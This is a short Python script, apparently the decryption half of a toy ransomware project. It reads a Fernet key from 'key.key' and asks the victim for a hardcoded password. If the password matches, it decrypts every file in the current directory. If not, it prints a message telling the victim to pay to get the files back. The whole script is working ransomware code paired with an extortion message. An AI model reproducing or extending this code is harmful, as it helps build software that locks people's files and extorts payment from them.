#!usr/bin/ env python3

import os
from cryptography.fernet import Fernet

#Let's encrypt files

sysfiles = []
for file in os.listdir():
	if file == "wannadie.py" or file == "key.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		sysfiles.append(file)

print(sysfiles)

with open("key.key", "rb") as key:
	password = key.read()



passphrase ="gaab$@"


userpass = input ("Enter the password that i gave you to unlock your files ^_^\n")


if userpass == passphrase:
	for file in sysfiles:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decr = Fernet(password).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decr)

	print("All of your files have been unlocked by @Ahmed ABS ENJOY!!!!!!")

else:

	print("Sorry,Wrong password,please pay to get your files back :(")
